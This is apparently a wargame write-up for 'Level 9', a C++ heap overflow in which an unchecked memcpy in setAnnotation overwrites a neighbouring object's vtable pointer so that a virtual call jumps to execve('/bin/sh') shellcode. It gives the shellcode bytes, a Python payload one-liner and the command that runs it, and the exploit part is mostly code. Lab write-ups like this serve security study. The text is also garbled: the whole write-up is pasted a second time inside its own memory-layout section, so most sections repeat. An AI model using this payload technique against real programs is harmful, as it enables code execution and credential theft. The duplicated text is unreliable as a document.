# Level 9 — C++ Object Overflow (vtable Hijack)

## Overview

This level introduces a **C++ object overflow**.

* Two objects are allocated (`N`)
* One contains a buffer (annotation)
* The other contains a **virtual function pointer (vtable)**
* Overflow allows us to overwrite this pointer

Goal:

```
Execute shellcode → get next password
```

---

## 1. Key Idea

We overflow inside an object
Overwrite its **vtable pointer**
Redirect execution to our **shellcode**

---

## 2. Program Behavior (Simplified)

```cpp
N *obj1 = new N(5);
N *obj2 = new N(6);

obj1->setAnnotation(argv[1]);

obj2->virtual_function(obj1);
```

---

## 3. Vulnerability

Inside:

```cpp
setAnnotation(char *input)
```

There is:

```c
memcpy(this->annotation, input, strlen(input));
```

No bounds check → overflow

---

## 4. Important Observation

From GDB:

```bash
(gdb) info registers eax
eax = 0x804a00c
```

So:

```
object address = 0x804a00c
```

Then:

```
0x804a00c + 4 = 0x804a010
```

This is where our buffer (annotation) starts.

---

## 5. Memory Layout

````
# Level 9 — C++ Object Overflow (vtable Hijack)

## Overview

This level introduces a **C++ object overflow**.

* Two objects are allocated (`N`)
* One contains a buffer (annotation)
* The other contains a **virtual function pointer (vtable)**
* Overflow allows us to overwrite this pointer

Goal:

```
Execute shellcode → get next password
```

---

## 1. Key Idea

We overflow inside an object
Overwrite its **vtable pointer**
Redirect execution to our **shellcode**

---

## 2. Program Behavior (Simplified)

```cpp
N *obj1 = new N(5);
N *obj2 = new N(6);

obj1->setAnnotation(argv[1]);

obj2->virtual_function(obj1);
```

---

## 3. Vulnerability

Inside:

```cpp
setAnnotation(char *input)
```

There is:

```c
memcpy(this->annotation, input, strlen(input));
```

No bounds check → overflow

---

## 4. Important Observation

From GDB:

```bash
(gdb) info registers eax
eax = 0x804a00c
```

So:

```
object address = 0x804a00c
```

Then:

```
0x804a00c + 4 = 0x804a010
```

This is where our buffer (annotation) starts

---

## 5. Memory Layout

```
[ obj1 ]
| vtable ptr | buffer (annotation) |

[ obj2 ]
| vtable ptr | ... |
```

Overflow from `obj1` → reaches `obj2`

---

## 6. Exploit Strategy

We overwrite:

```
obj2->vtable pointer
```

So when this happens:

```asm
call *%edx
```

It jumps to **our controlled address**

---

## 7. Plan

1. Put **shellcode in memory**
2. Overwrite vtable pointer
3. Redirect execution to shellcode

---

## 8. Shellcode

```bash
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

---

## 9. Payload Structure

```
[ shellcode address ]
[ shellcode ]
[ padding ]
[ overwritten vtable pointer ]
```

---

## 10. Payload

```bash
python -c "print '\x08\x04\xa0\x10'[::-1] + \
'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + \
83 * 'A' + '\x08\x04\xa0\x0c'[::-1]" > /tmp/inj9
```

---

## 11. Exploitation

```bash
./level9 $(cat /tmp/inj9)
```

---

## 12. What Happens

1. Shellcode stored in memory (`0x804a010`)
2. Overflow reaches `obj2`
3. vtable pointer overwritten
4. Program calls virtual function
5. Execution jumps → shellcode

---

## 13. Result

```bash
$ cat /home/user/bonus0/.pass
```

---

## 14. Why It Works

* No bounds check in `setAnnotation`
* Objects placed close in heap
* vtable pointer is overwriteable
* Virtual call uses controlled pointer

---

## 15. Key Takeaways

* C++ objects = structure + vtable pointer
* Overflow can corrupt object metadata
* Virtual calls can be hijacked
* Heap layout is critical for exploitation

---
[ obj1 ]
| vtable ptr | buffer (annotation) |

[ obj2 ]
| vtable ptr | ... |
````

Overflow from `obj1` reaches `obj2`.

---

## 6. Exploit Strategy

We overwrite:

```
obj2->vtable pointer
```

So when this happens:

```asm
call *%edx
```

It jumps to a controlled address.

---

## 7. Plan

1. Put **shellcode in memory**
2. Overwrite vtable pointer
3. Redirect execution to shellcode

---

## 8. Shellcode

```bash
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

---

## 9. Payload Structure

```
[ shellcode address ]
[ shellcode ]
[ padding ]
[ overwritten vtable pointer ]
```

---

## 10. Payload

```bash
python -c "print '\x08\x04\xa0\x10'[::-1] + \
'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + \
83 * 'A' + '\x08\x04\xa0\x0c'[::-1]" > /tmp/inj9
```

---

## 11. Exploitation

```bash
./level9 $(cat /tmp/inj9)
```

---

## 12. What Happens

1. Shellcode stored in memory (`0x804a010`)
2. Overflow reaches `obj2`
3. vtable pointer overwritten
4. Program calls virtual function
5. Execution jumps to shellcode

---

## 13. Result

```bash
$ cat /home/user/bonus0/.pass
```

---

## 14. Why It Works

* No bounds check in `setAnnotation`
* Objects placed close in heap
* vtable pointer is overwriteable
* Virtual call uses controlled pointer

---

## 15. Key Takeaways

* C++ objects = structure + vtable pointer
* Overflow can corrupt object metadata
* Virtual calls can be hijacked
* Heap layout is critical for exploitation

---
